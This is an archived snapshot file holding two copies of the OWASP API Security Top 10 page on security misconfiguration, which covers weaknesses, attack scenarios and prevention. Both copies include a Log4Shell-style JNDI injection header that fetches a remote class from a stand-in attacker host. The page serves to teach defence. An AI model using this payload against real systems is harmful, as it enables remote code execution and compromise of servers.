# owasp-api-error-handling — upstream snapshot (2026-08-01 refresh, append-only)

**Source URL(s):** https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/ (re-fetched 2026-08-01; every pre-existing section below the divider is preserved verbatim)
**HTTP status:** 200
**Fetched at:** 2026-08-01T02:24:20Z
**Extractor invocation:** `practices/scripts/snapshot-extract.sh https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/`
**Fetch receipt:** `practices/upstream/_FETCH-RECEIPTS.yaml` id `r122`
**Body SHA-256 (below the `---` divider, header excluded):** 686f0418d66a495ec8d6079228e7ab00d021f8c522bb89ce0d87d1f83aeefdb1

---

---
snapshot_id: owasp-api-error-handling
source: "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
fetched_at: "2026-07-14T00:00:00Z"
version_observed: "as published, fetched 2026-07-14"
via: curl
tier: 3
bytes: 5474
sha: "fcff5c4812250c318f212e4aae054ba2c91da49549d3cb9193efadfa5fce94d8"
---

# owasp api error handling — upstream snapshot

Source: https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/
Fetched: 2026-07-14

API8:2023 Security Misconfiguration - OWASP API Security Top 10
Skip to content

# API8:2023 Security Misconfiguration
Threat agents/Attack vectors
Security Weakness
Impacts
API Specific : Exploitability Easy
Prevalence Widespread : Detectability Easy
Technical Severe : Business Specific
Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available.
Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options.
Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise.

## Is the API Vulnerable?
The API might be vulnerable if:
Appropriate security hardening is missing across any part of the API stack,
 or if there are improperly configured permissions on cloud services
The latest security patches are missing, or the systems are out of date
Unnecessary features are enabled (e.g. HTTP verbs, logging features)
There are discrepancies in the way incoming requests are processed by servers
 in the HTTP server chain
Transport Layer Security (TLS) is missing
Security or cache control directives are not sent to clients
A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
Error messages include stack traces, or expose other sensitive information

## Example Attack Scenarios

### Scenario #1
An API back-end server maintains an access log written by a popular third-party
open-source logging utility with support for placeholder expansion and JNDI
(Java Naming and Directory Interface) lookups, both enabled by default. For
each request, a new entry is written to the log file with the following
pattern: / - .
A bad actor issues the following API request, which gets written to the access
log file:
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
Due to the insecure default configuration of the logging utility and a
permissive network outbound policy, in order to write the corresponding entry
to the access log, while expanding the value in the X-Api-Version request
header, the logging utility will pull and execute the Malicious.class object
from the attacker's remote controlled server.

### Scenario #2
A social network website offers a "Direct Message" feature that allows users to
keep private conversations. To retrieve new messages for a specific
conversation, the website issues the following API request (user interaction is
not required):
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
Because the API response does not include the Cache-Control HTTP response
header, private conversations end-up cached by the web browser, allowing
malicious actors to retrieve them from the browser cache files in the
filesystem.

## How To Prevent
The API life cycle should include:
A repeatable hardening process leading to fast and easy deployment of a
 properly locked down environment
A task to review and update configurations across the entire API stack. The
 review should include: orchestration files, API components, and cloud
 services (e.g. S3 bucket permissions)
An automated process to continuously assess the effectiveness of the
 configuration and settings in all environments
Furthermore:
Ensure that all API communications from the client to the API server and any
 downstream/upstream components happen over an encrypted communication channel
 (TLS), regardless of whether it is an internal or public-facing API.
Be specific about which HTTP verbs each API can be accessed by: all other
 HTTP verbs should be disabled (e.g. HEAD).
APIs expecting to be accessed from browser-based clients (e.g., WebApp
 front-end) should, at least:
implement a proper Cross-Origin Resource Sharing (CORS) policy
include applicable Security Headers
Restrict incoming content types/data formats to those that meet the business/
 functional requirements.
Ensure all servers in the HTTP server chain (e.g. load balancers, reverse
 and forward proxies, and back-end servers) process incoming requests in a
 uniform manner to avoid desync issues.
Where applicable, define and enforce all API response payload schemas,
 including error responses, to prevent exception traces and other valuable
 information from being sent back to attackers.

## References

### OWASP
OWASP Secure Headers Project
Configuration and Deployment Management Testing - Web Security Testing
 Guide
Testing for Error Handling - Web Security Testing Guide
Testing for Cross Site Request Forgery - Web Security Testing Guide

### External
CWE-2: Environmental Security Flaws
CWE-16: Configuration
CWE-209: Generation of Error Message Containing Sensitive Information
CWE-319: Cleartext Transmission of Sensitive Information
CWE-388: Error Handling
CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
 Smuggling')
CWE-942: Permissive Cross-domain Policy with Untrusted Domains
Guide to General Server Security, NIST
Let's Encrypt: a free, automated, and open Certificate Authority

---

## Upstream refresh 2026-08-01 (verbatim extractor output)

Source: https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/
HTTP status: 200 · extracted bytes: 7296 · sha256: 823ece2102a87a94ee5874f718c5f76fb5dce4997627f384e946fafa568564b9
Extractor: `practices/scripts/snapshot-extract.sh` (curl -> deterministic HTML->text; no model in the loop)
Fetch receipt: `practices/upstream/_FETCH-RECEIPTS.yaml` id `r122`

Everything above this divider is the previous snapshot, preserved byte-for-byte (append-only:
history is recorded, never rewritten). The block below is the UNMODIFIED extractor output for
the 2026-08-01 re-fetch of the same URL — it is the current upstream text, and any citation that
claims to quote this source verbatim must match it.

API8:2023 Security Misconfiguration - OWASP API Security Top 10 Skip to content OWASP API Security Top 10 API8:2023 Security Misconfiguration Bahasa (Indonesian) English Français Persian Português (Portugal) Initializing search OWASP/API-Security Home 2023 2019 OWASP API Security Top 10 OWASP/API-Security Home Home How-to Contribute 2023 2023 Notice Table of Contents About OWASP Foreword Introduction Release Notes API Security Risks OWASP Top 10 API Security Risks – 2023 API1:2023 Broken Object Level Authorization API2:2023 Broken Authentication API3:2023 Broken Object Property Level Authorization API4:2023 Unrestricted Resource Consumption API5:2023 Broken Function Level Authorization API6:2023 Unrestricted Access to Sensitive Business Flows API7:2023 Server Side Request Forgery API8:2023 Security Misconfiguration API8:2023 Security Misconfiguration Table of contents Is the API Vulnerable? Example Attack Scenarios Scenario #1 Scenario #2 How To Prevent References OWASP External API9:2023 Improper Inventory Management API10:2023 Unsafe Consumption of APIs What's Next For Developers What's Next For DevSecOps Methodology and Data Acknowledgments 2019 2019 Notice Table of Contents About OWASP Foreword Introduction Release Notes API Security Risks OWASP Top 10 API Security Risks – 2019 API1:2019 Broken Object Level Authorization API2:2019 Broken User Authentication API3:2019 Excessive Data Exposure API4:2019 Lack of Resources & Rate Limiting API5:2019 Broken Function Level Authorization API6:2019 - Mass Assignment API7:2019 Security Misconfiguration API8:2019 Injection API9:2019 Improper Assets Management API10:2019 Insufficient Logging & Monitoring What's Next For Developers What's Next For DevSecOps Methodology and Data Acknowledgments Table of contents Is the API Vulnerable? Example Attack Scenarios Scenario #1 Scenario #2 How To Prevent References OWASP External API8:2023 Security Misconfiguration Threat agents/Attack vectors Security Weakness Impacts API Specific : Exploitability Easy Prevalence Widespread : Detectability Easy Technical Severe : Business Specific Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available. Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options. Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise. Is the API Vulnerable? The API might be vulnerable if: Appropriate security hardening is missing across any part of the API stack, or if there are improperly configured permissions on cloud services The latest security patches are missing, or the systems are out of date Unnecessary features are enabled (e.g. HTTP verbs, logging features) There are discrepancies in the way incoming requests are processed by servers in the HTTP server chain Transport Layer Security (TLS) is missing Security or cache control directives are not sent to clients A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set Error messages include stack traces, or expose other sensitive information Example Attack Scenarios Scenario #1 An API back-end server maintains an access log written by a popular third-party open-source logging utility with support for placeholder expansion and JNDI (Java Naming and Directory Interface) lookups, both enabled by default. For each request, a new entry is written to the log file with the following pattern: <method> <api_version>/<path> - <status_code> . A bad actor issues the following API request, which gets written to the access log file: GET /health X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class} Due to the insecure default configuration of the logging utility and a permissive network outbound policy, in order to write the corresponding entry to the access log, while expanding the value in the X-Api-Version request header, the logging utility will pull and execute the Malicious.class object from the attacker's remote controlled server. Scenario #2 A social network website offers a "Direct Message" feature that allows users to keep private conversations. To retrieve new messages for a specific conversation, the website issues the following API request (user interaction is not required): GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA Because the API response does not include the Cache-Control HTTP response header, private conversations end-up cached by the web browser, allowing malicious actors to retrieve them from the browser cache files in the filesystem. How To Prevent The API life cycle should include: A repeatable hardening process leading to fast and easy deployment of a properly locked down environment A task to review and update configurations across the entire API stack. The review should include: orchestration files, API components, and cloud services (e.g. S3 bucket permissions) An automated process to continuously assess the effectiveness of the configuration and settings in all environments Furthermore: Ensure that all API communications from the client to the API server and any downstream/upstream components happen over an encrypted communication channel (TLS), regardless of whether it is an internal or public-facing API. Be specific about which HTTP verbs each API can be accessed by: all other HTTP verbs should be disabled (e.g. HEAD). APIs expecting to be accessed from browser-based clients (e.g., WebApp front-end) should, at least: implement a proper Cross-Origin Resource Sharing (CORS) policy include applicable Security Headers Restrict incoming content types/data formats to those that meet the business/ functional requirements. Ensure all servers in the HTTP server chain (e.g. load balancers, reverse and forward proxies, and back-end servers) process incoming requests in a uniform manner to avoid desync issues. Where applicable, define and enforce all API response payload schemas, including error responses, to prevent exception traces and other valuable information from being sent back to attackers. References OWASP OWASP Secure Headers Project Configuration and Deployment Management Testing - Web Security Testing Guide Testing for Error Handling - Web Security Testing Guide Testing for Cross Site Request Forgery - Web Security Testing Guide External CWE-2: Environmental Security Flaws CWE-16: Configuration CWE-209: Generation of Error Message Containing Sensitive Information CWE-319: Cleartext Transmission of Sensitive Information CWE-388: Error Handling CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') CWE-942: Permissive Cross-domain Policy with Untrusted Domains Guide to General Server Security , NIST Let's Encrypt: a free, automated, and open Certificate Authority Previous API7:2023 Server Side Request Forgery Next API9:2023 Improper Inventory Management © Copyright 2023 - OWASP API Security Project team Made with Material for MkDocs
